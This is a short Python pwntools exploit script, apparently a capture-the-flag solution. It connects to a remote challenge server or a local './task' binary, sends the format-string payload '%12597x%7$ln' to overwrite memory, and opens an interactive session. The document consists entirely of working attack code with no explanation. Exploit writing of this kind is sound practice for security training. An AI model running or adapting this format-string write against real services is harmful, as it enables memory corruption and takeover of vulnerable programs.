from pwn import process, remote, p64, u64, log
import os 

def exploit(connect):
    if(connect == True):
        r = remote('rivit.dev', 10002)
    else:
        r = process('./task')

    payload = "%12597x%7$ln"
    # if(len(payload) % 8 == 0):
    r.sendlineafter('> ', payload)
    r.interactive()
    # else:
    #     log.failure("Error!!! Can't send payload!")
    #     os.system("exit")

exploit(True)
